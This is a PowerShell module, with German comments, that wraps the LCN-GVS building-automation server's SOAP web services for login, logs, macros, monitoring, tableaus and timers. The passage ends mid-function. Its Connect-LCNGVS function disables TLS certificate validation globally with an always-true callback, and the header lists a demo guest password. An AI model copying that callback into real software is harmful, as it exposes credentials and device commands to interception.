###############################################################
#
# PowerShell Module: ISSENDORFF.LCNGVS.Commands
#
# Das PowerShell Module ISSENDORFF.LCNGVS.Commands wurde entwickelt, um ueber die PowerShell 
# Kommandos an den LCN-GVS Visualisierungssserver zu senden. Es bietet u.a. die gleichen Funktionalitaeten, wie 
# die LCN-GVS-App und verwendet aussschliesslich die WebServices des LCN-GVS-Visualisierungssservers. Die 
# LCN-GVS-App ist die Visualisierungsoberflaeche fuer iPhone, iPad und iPod Touch fuer das LCN-GVS "Globale 
# Visualisierungs-System" der ISSENDORFF KG.
#
# Generiert von: lmissel
# Generiert am: 30.03.2020
#
# HelpUri: https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands
#
# Beispiel:
# ---------
# Connect-LCNGVS -Uri "http://access.lcn.de/LCNGVSDemo" -Credential (Microsoft.PowerShell.Security\Get-Credential)
#
# UserName: guest
# Password: lcn
#
###############################################################

# -----------------------------------------------
# Modulevariablen
# -----------------------------------------------
$Script:LCNGVSSession = $null
$Script:LocalizedData = Import-LocalizedData

# -----------------------------------------------
# Private Funktionen, kleine Helferlein, Enums und Konstanten
# -----------------------------------------------
#region Helper

# Enums laden...
$Enums = @( Get-ChildItem -Path $PSScriptRoot\Enumerations\*.ps1 -ErrorAction SilentlyContinue )
Foreach ($import in @($Enums))
{
    try 
    {
        . $import.fullname
    } 
    catch
    {
        Write-Error -Message "Fehler beim Laden der Datei $($import.fullname): $_"
    }
}

<#
    .SYNOPSIS
        Ruft die WSDL-Datei des WebServices ab.
    .DESCRIPTION
        Ruft die WSDL-Datei des WebServices ab und gibt den Inhalt als String aus.       
    .PARAMETER  Uri
        Gibt die URL der WSDL-Datei an.
    .EXAMPLE
        Receive-WSDLFile -Uri "http://access.lcn.de/LCNGVSDemo/WebServices/Authentification1.asmx?wsdl"
#>
function Receive-WSDLFile
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$false, 
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Receive-WSDLFile',
                  ConfirmImpact='Medium')]
    [Alias('WSDL')]
    [OutputType()]
    param(
        [Uri] $Uri
    )

    $webrequest = [System.Net.HTTPWebRequest]::Create($Uri);
    $webrequest.CookieContainer = $Script:authSvc.CookieContainer
    $webrequest.Method = [Microsoft.PowerShell.Commands.WebRequestMethod]::Get
    $response = $webrequest.GetResponse()
    $responseStream = $response.GetResponseStream()
    $streamReader = New-Object System.IO.Streamreader($responseStream)
    $output = $streamReader.ReadToEnd()
    return $output
}

<#
    .SYNOPSIS
        Liefert alle Cmdlets des Modules
    .DESCRIPTION
        Liefert alle Cmdlets des Modules        
    .EXAMPLE
        Get-LCNGVSCommands
#>
function Get-LCNGVSCommands
{
    Get-Command -Name *LCNGVS*
}

<#
    .SYNOPSIS
        Erstellt eine TableauUri.
    .DESCRIPTION
        Erstellt eine TableauUri anhand des uebergebenen Tableaus.        
    .PARAMETER  Tableau
        Gibt das Tableau an, aus dem eine TableauUri erstellt werden soll.
    .EXAMPLE
        New-LCNGVSTableauUri -Tableau $Tableau
#>
function New-LCNGVSTableauUri
{
    param
    (
        [LCNGVS.Tableau.Tableau] $Tableau
    )

    return ($Tableau.TableauGroupName + "\" + $Tableau.TableauInfo.tableauId)
}

#endregion
 
# -----------------------------------------------
# Webservice: Authentification
# -----------------------------------------------
#region WebService: Authentification

# -----------------------------------------------
# Benutzeran- bzw. Benutzerabmeldung, Benutzerrechte
# -----------------------------------------------

<#
    .SYNOPSIS
        Melden Sie sich an dem LCN-GVS Server an.    
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich am LCN-GVS Server an.
    .PARAMETER  Uri
        Die Url des LCN-GVS Servers.
    .PARAMETER  Credential
        Benutzername und Password
    .EXAMPLE
        Connect-LCNGVS -Uri "http://access.lcn.de/LCNGVSDemo" -Credential (Microsoft.PowerShell.Security\Get-Credential)
    .LINK
        Disconnect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Connect-LCNGVS # Alias: 'Login-LCNGVSServer'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Connect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Login-LCNGVSServer')]
    [OutputType()]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Uri] $Uri,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
		[ValidateNotNull()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential,

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2,
                   ParameterSetName='Default')]
        $CreatePersistentCookie = $true
    )

    Begin
    {
        Write-Verbose "Starting $($MyInvocation.Mycommand)"

        # Zuruecksetzen der SessionVariable
        $Script:LCNGVSSession = $null

        # Laden von Assemblys aus dem globalen Assemblycache (veraltete Methode)
        [void][System.Reflection.Assembly]::LoadWithPartialName("System.Exception")

        # Bricht die Ausfuehrung ab, wenn ein Fehler auftritt
        $ErrorActionPreference = "Stop"
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", ($Script:LocalizedData.ConnectLCNGVS -f $Credential.UserName)))
        {
            # ServerCertificateValidationCallback
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { return $true }
        
            try
            {
                # WebService Authentification1
                Write-Verbose "Step 1 - Benutzer wird angemeldet..."
                [Uri] $UriAuthentification1 = $Uri.AbsoluteUri + "/WebServices/Authentification1.asmx?wsdl" # Uri erstellen
                $Script:authSvc = New-WebServiceProxy -Uri $UriAuthentification1 -Namespace "LCNGVS.Authentification" # WebProxy erstellen
                $Script:authSvc.CookieContainer = New-Object System.Net.CookieContainer # Cookies zwischenspeichern
                $Script:LCNGVSSession = $Script:authSvc.Login($Credential.UserName, $Credential.GetNetworkCredential().Password, $CreatePersistentCookie) # Anmeldung

                # EventHandler erzeugen
                Write-Verbose "Step 2 - Registriere Ereignishandler in der PowerShell..."
                Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginCompleted" -Action {
                    (New-Event -SourceIdentifier "LoginCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null

                Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginSecureBeginCompleted" -Action {
                    (New-Event -SourceIdentifier "LoginSecureBeginCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null

                Register-ObjectEvent -InputObject $Script:authSvc -EventName "LoginSecureEndCompleted" -Action {
                    (New-Event -SourceIdentifier "LoginSecureEndCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null
            
                Register-ObjectEvent -InputObject $Script:authSvc -EventName "LogoutCompleted" -Action {
                    (New-Event -SourceIdentifier "LogoutCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null
            
                Register-ObjectEvent -InputObject $Script:authSvc -EventName "GetServerInfoCompleted" -Action {
                    (New-Event -SourceIdentifier "GetServerInfoCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null

                Register-ObjectEvent -InputObject $Script:authSvc -EventName "SetUserCustomDataCompleted" -Action {
                    (New-Event -SourceIdentifier "SetUserCustomDataCompleted" -Sender $args[0] -EventArguments $args[1])
                } | Out-Null

                if ($Script:LCNGVSSession.isSuccess)
                { 
                    #region Logs1
                    # WSDL herunterladen...
                    Write-Verbose "Step 3 - Verbindung zum WebService Log1 wird hergestellt..."
                    [Uri] $UriLogs1 = $Uri.AbsoluteUri + "/WebServices/Logs1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriLogs1
                    $output | Set-Content -Path "$env:TEMP\Logs1.wsdl"
                    $Script:Logs1Svc = New-WebServiceProxy -Uri "$env:TEMP\Logs1.wsdl" -Namespace "LCNGVS.Logs"
                    $Script:Logs1Svc.CookieContainer = $Script:authSvc.CookieContainer
                
                    # EventHandler erzeugen
                    Write-Verbose "Step 4 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogLcnGvsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogLcnGvsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogLcnServerCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogLcnServerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogAccessControlCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogAccessControlCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogMonitoringServerCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogMonitoringServerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogTimerCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:Logs1Svc -EventName "GetLogMacroServerCompleted" -Action {
                        (New-Event -SourceIdentifier "GetLogMacroServerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion

                    #region Status1
                    # WSDL herunterladen...
                    Write-Verbose "Step 5 - Verbindung zum WebService Service1 wird hergestellt..."
                    [Uri] $UriStatus1 = $Uri.AbsoluteUri + "/WebServices/Status1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriStatus1
                    $output | Set-Content -Path "$env:TEMP\Status1.wsdl"
                    $Script:Status1Svc = New-WebServiceProxy -Uri "$env:TEMP\Status1.wsdl" -Namespace "LCNGVS.Status"
                    $Script:Status1Svc.CookieContainer = $Script:authSvc.CookieContainer

                    # EventHandler erzeugen
                    Write-Verbose "Step 6 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:Status1Svc -EventName "GetStatusCompleted" -Action {
                        (New-Event -SourceIdentifier "GetStatusCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion

                    #region MacroServer1
                    # WSDL herunterladen...
                    Write-Verbose "Step 7 - Verbindung zum WebService MacroService1 wird hergestellt..."
                    [Uri] $UriMacroServer1 = $Uri.AbsoluteUri + "/WebServices/MacroServer1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriMacroServer1
                    $output | Set-Content -Path "$env:TEMP\MacroServer1.wsdl"
                    $Script:MacroServer1Svc = New-WebServiceProxy -Uri "$env:TEMP\MacroServer1.wsdl" -Namespace "LCNGVS.MacroServer"
                    $Script:MacroServer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                    # EventHandler erzeugen
                    Write-Verbose "Step 8 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "IsEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "SetEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "GetMacrosCompleted" -Action {
                        (New-Event -SourceIdentifier "GetMacrosCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:MacroServer1Svc -EventName "ExecuteMacroCompleted" -Action {
                        (New-Event -SourceIdentifier "ExecuteMacroCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion

                    #region MonitoringServer1
                    # WSDL herunterladen...
                    Write-Verbose "Step 9 - Verbindung zum WebService MonitoringServer1 wird hergestellt..."
                    [Uri] $UriMonitoringServer1 = $Uri.AbsoluteUri + "/WebServices/MonitoringServer1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriMonitoringServer1
                    $output | Set-Content -Path "$env:TEMP\MonitoringServer1.wsdl"
                    $Script:MonitoringServer1Svc = New-WebServiceProxy -Uri "$env:TEMP\MonitoringServer1.wsdl" -Namespace "LCNGVS.MonitoringServer"
                    $Script:MonitoringServer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                    # EventHandler erzeugen
                    Write-Verbose "Step 10 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "IsEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "SetEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RegisterOrReplaceDeviceCompleted" -Action {
                        (New-Event -SourceIdentifier "RegisterOrReplaceDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                
                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeregisterDeviceCompleted" -Action {
                        (New-Event -SourceIdentifier "DeregisterDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetRegisteredDeviceCompleted" -Action {
                        (New-Event -SourceIdentifier "GetRegisteredDeviceCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetRegisteredServerCompleted" -Action {
                        (New-Event -SourceIdentifier "GetRegisteredServerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RegisterForMonitoringEventPushNotificationsCompleted" -Action {
                        (New-Event -SourceIdentifier "RegisterForMonitoringEventPushNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeregisterFromMonitoringEventPushNotificationsCompleted" -Action {
                        (New-Event -SourceIdentifier "DeregisterFromMonitoringEventPushNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetPendingNotificationsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetPendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "RemovePendingNotificationsCompleted" -Action {
                        (New-Event -SourceIdentifier "RemovePendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "IsReadPendingNotificationsCompleted" -Action {
                        (New-Event -SourceIdentifier "IsReadPendingNotificationsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetMonitoringActionsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetMonitoringActionsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "AddOrReplaceMonitoringActionCompleted" -Action {
                        (New-Event -SourceIdentifier "AddOrReplaceMonitoringActionCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeleteMonitoringActionCompleted" -Action {
                        (New-Event -SourceIdentifier "DeleteMonitoringActionCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "GetMonitoringEventsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetMonitoringEventsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "AddOrReplaceMonitoringEventCompleted" -Action {
                        (New-Event -SourceIdentifier "AddOrReplaceMonitoringEventCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:MonitoringServer1Svc -EventName "DeleteMonitoringEventCompleted" -Action {
                        (New-Event -SourceIdentifier "DeleteMonitoringEventCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null
                                
                    #endregion

                    #region Tableau1
                    # WSDL herunterladen...
                    Write-Verbose "Step 11 - Verbindung zum WebService Tableau1 wird hergestellt..."
                    [Uri] $UriTableau1 = $Uri.AbsoluteUri + "/WebServices/Tableau1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriTableau1
                    $output | Set-Content -Path "$env:TEMP\Tableau1.wsdl"
                    $Script:Tableau1Svc = New-WebServiceProxy -Uri "$env:TEMP\Tableau1.wsdl" -Namespace "LCNGVS.Tableau"
                    $Script:Tableau1Svc.CookieContainer = $Script:authSvc.CookieContainer

                    Write-Verbose "Step 12 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTableausCompleted" -Action {
                        (New-Event -SourceIdentifier "GetTableausCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "OpenTableauCompleted" -Action {
                        (New-Event -SourceIdentifier "OpenTableauCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "CloseTableauCompleted" -Action {
                        (New-Event -SourceIdentifier "CloseTableauCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetImagesCompleted" -Action {
                        (New-Event -SourceIdentifier "GetImagesCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "PollUpdatesCompleted" -Action {
                        (New-Event -SourceIdentifier "PollUpdatesCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "SubmitButtonCompleted" -Action {
                        (New-Event -SourceIdentifier "SubmitButtonCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "SubmitDimmerCompleted" -Action {
                        (New-Event -SourceIdentifier "SubmitDimmerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetSupportedTrendLogSourcesCompleted" -Action {
                        (New-Event -SourceIdentifier "GetSupportedTrendLogSourcesCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetTrendLogsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "CloseTrendLogCompleted" -Action {
                        (New-Event -SourceIdentifier "CloseTrendLogCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "OpenTrendLogCompleted" -Action {
                        (New-Event -SourceIdentifier "OpenTrendLogCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogValuesCompleted" -Action {
                        (New-Event -SourceIdentifier "GetTrendLogValuesCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Tableau1Svc -EventName "GetTrendLogValuesMultipleCompleted" -Action {
                        (New-Event -SourceIdentifier "GetTrendLogValuesMultipleCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion

                    #region Timer1
                    # WSDL herunterladen...
                    Write-Verbose "Step 13 - Verbindung zum WebService Timer1 wird hergestellt..."
                    [Uri] $UriTimer1 = $Uri.AbsoluteUri + "/WebServices/Timer1.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriTimer1
                    $output | Set-Content -Path "$env:TEMP\Timer1.wsdl"
                    $Script:Timer1Svc = New-WebServiceProxy -Uri "$env:TEMP\Timer1.wsdl" -Namespace "LCNGVS.Timer"
                    $Script:Timer1Svc.CookieContainer = $Script:authSvc.CookieContainer

                    # EventHandler erzeugen
                    Write-Verbose "Step 14 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "IsEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "IsEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "SetEnabledCompleted" -Action {
                        (New-Event -SourceIdentifier "SetEnabledCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "GetTimerEventsCompleted" -Action {
                        (New-Event -SourceIdentifier "GetTimerEventsCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "AddOrReplaceTimerCompleted" -Action {
                        (New-Event -SourceIdentifier "AddOrReplaceTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:Timer1Svc -EventName "DeleteTimerCompleted" -Action {
                        (New-Event -SourceIdentifier "DeleteTimerCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion

                    #region AppSiri
                    # WSDL herunterladen...
                    Write-Verbose "Step 15 - Verbindung zum WebService AppSiri wird hergestellt..."
                    [Uri] $UriAppSiri = $Uri.AbsoluteUri + "/WebServices/AppSiri.asmx?wsdl"
                    $output = Receive-WSDLFile -Uri $UriAppSiri
                    $output | Set-Content -Path "$env:TEMP\AppSiri.wsdl"
                    $Script:AppSiriSvc = New-WebServiceProxy -Uri "$env:TEMP\AppSiri.wsdl" -Namespace "LCNGVS.AppSiri"
                    $Script:AppSiriSvc.CookieContainer = $Script:authSvc.CookieContainer

                    # EventHandler erzeugen
                    Write-Verbose "Step 16 - Registriere Ereignishandler in der PowerShell..."
                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "LoaddicCompleted" -Action {
                        (New-Event -SourceIdentifier "LoaddicCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "CommandExecuteCompleted" -Action {
                        (New-Event -SourceIdentifier "CommandExecuteCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "dimmingCommandCompleted" -Action {
                        (New-Event -SourceIdentifier "dimmingCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "changeBrightnessCommandCompleted" -Action {
                        (New-Event -SourceIdentifier "changeBrightnessCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "absRegulatorCommandCompleted" -Action {
                        (New-Event -SourceIdentifier "absRegulatorCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    Register-ObjectEvent -InputObject $Script:AppSiriSvc -EventName "relRegulatorCommandCompleted" -Action {
                        (New-Event -SourceIdentifier "relRegulatorCommandCompleted" -Sender $args[0] -EventArguments $args[1])
                    } | Out-Null

                    #endregion
                }
            }
            catch [System.Exception]
            {
                Write-Error $_
            }
            finally
            {
                if ($Script:LCNGVSSession)
                {
                    $Script:LCNGVSSession | Add-Member -MemberType NoteProperty -Name UserName -Value $Credential.UserName
                    $Script:LCNGVSSession
                }
            }
        }
    }
    End
    {
        Write-Verbose "Ending $($MyInvocation.Mycommand)"
    }
}

<#
    .SYNOPSIS
        Melden Sie sich vom LCN-GVS Server ab.    
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich vom LCN-GVS Server ab.
    .EXAMPLE
        Disconnect-LCNGVS
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
#>
function Disconnect-LCNGVS # Alias: 'Logout-LCNGVSServer'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Disconnect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Logout-LCNGVSServer')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "Starting $($MyInvocation.Mycommand)"

        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.DisconnectLCNGVS))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {                    
                    $Script:authSvc.Logout()
                    $Script:LCNGVSSession.isSuccess = $false
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
                finally
                {
                    $Script:LCNGVSSession
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "Ending $($MyInvocation.Mycommand)"
    }
}

<#
    .SYNOPSIS
        Melden Sie sich vom LCN-GVS Server ab.    
    .DESCRIPTION
        Mit diesem Befehl melden Sie sich vom LCN-GVS Server ab.
    .EXAMPLE
        Disconnect-LCNGVSAsync
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVS
        Get-LCNGVSSession
        Get-LCNGVSUserRights
#>
function Disconnect-LCNGVSAsync # Alias: 'Logout-LCNGVSServerAsync'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Disconnect-LCNGVSServer',
                  ConfirmImpact='Medium')]
    [Alias('Logout-LCNGVSServerAsync')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "Starting $($MyInvocation.Mycommand)"

        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.DisconnectLCNGVS))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {                    
                    $Script:authSvc.LogoutAsync()
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "Ending $($MyInvocation.Mycommand)"
    }
}

<#
    .SYNOPSIS
        Ruft die Sitzungsinformationen ab.    
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die aktuelle Sitzungsinformation anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSSession
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSUserRights
#>
function Get-LCNGVSSession # Alias: 'Get-LoginResult'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
        SupportsShouldProcess=$true, 
        PositionalBinding=$false,
        HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSSession',
        ConfirmImpact='Medium')]
    [Alias('Get-LoginResult')]
    [OutputType()]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Authentification", $Script:LocalizedData.GetLCNGVSSession))
        {
            if ($Script:LCNGVSSession.isSuccess)
            {
                try
                {                    
                    $Script:LCNGVSSession
                }
                catch [System.Exception]
                {
                    Write-Error -Message $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft Ihre Benutzerrechte ab.    
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die aktuellen Benutzerrechte anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSUserRights
    .LINK
        Connect-LCNGVS
        Disconnect-LCNGVSAsync
        Get-LCNGVSSession
#>
function Get-LCNGVSUserRights # Alias: 'Get-UserRights'
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSUserRights',
                  ConfirmImpact='Medium')]
